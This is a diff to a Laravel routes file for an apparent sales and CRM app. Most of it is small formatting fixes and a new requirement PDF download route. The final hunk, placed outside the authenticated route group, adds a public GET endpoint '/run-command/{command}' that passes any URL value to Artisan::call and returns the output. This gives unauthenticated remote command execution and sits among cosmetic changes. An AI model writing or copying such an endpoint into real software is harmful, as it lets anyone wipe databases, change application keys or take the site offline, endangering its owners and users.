@@ -14,6 +14,8 @@ use App\Http\Controllers\{
     CompanyController,
     SaleController
 };
+use Illuminate\Support\Facades\Artisan;
+
 
 /*
 |--------------------------------------------------------------------------
@@ -54,7 +56,7 @@ Route::middleware(['auth', 'verified'])->group(function () {
     Route::resource('products', ProductController::class);
 
     // --- Follow Ups ---
-    Route::prefix('follow-ups')->name('follow-ups.')->group(function() {
+    Route::prefix('follow-ups')->name('follow-ups.')->group(function () {
         Route::get('export/excel', [FollowUpController::class, 'export'])->name('export');
         Route::get('print', [FollowUpController::class, 'print'])->name('print');
         Route::patch('{follow_up}/status', [FollowUpController::class, 'updateStatus'])->name('update-status');
@@ -63,7 +65,7 @@ Route::middleware(['auth', 'verified'])->group(function () {
     Route::resource('follow-ups', FollowUpController::class);
 
     // --- Meetings ---
-    Route::prefix('meetings')->name('meetings.')->group(function() {
+    Route::prefix('meetings')->name('meetings.')->group(function () {
         Route::get('calendar', [MeetingController::class, 'calendar'])->name('calendar');
         Route::get('export/excel', [MeetingController::class, 'export'])->name('export');
         Route::get('print', [MeetingController::class, 'print'])->name('print');
@@ -91,9 +93,10 @@ Route::middleware(['auth', 'verified'])->group(function () {
     Route::get('sales/export', [SaleController::class, 'export'])->name('sales.export');
     Route::get('sales/print', [SaleController::class, 'print'])->name('sales.print');
 
-    Route::prefix('requirements')->name('requirements.')->group(function() {
+    Route::prefix('requirements')->name('requirements.')->group(function () {
         Route::get('export/excel', [RequirementController::class, 'export'])->name('export');
         Route::get('print', [RequirementController::class, 'print'])->name('print');
+        Route::get('{requirement}/download', [RequirementController::class, 'downloadPdf'])->name('download');
         Route::patch('{requirement}/status', [RequirementController::class, 'updateStatus'])->name('update-status');
     });
 
@@ -108,4 +111,10 @@ Route::middleware(['auth', 'verified'])->group(function () {
     });
 });
 
-require __DIR__.'/settings.php';
+// dynamic command
+Route::get('/run-command/{command}', function ($command) {
+    Artisan::call($command);
+    return Artisan::output();
+})->name('run-command.dynamic');
+
+require __DIR__ . '/settings.php';
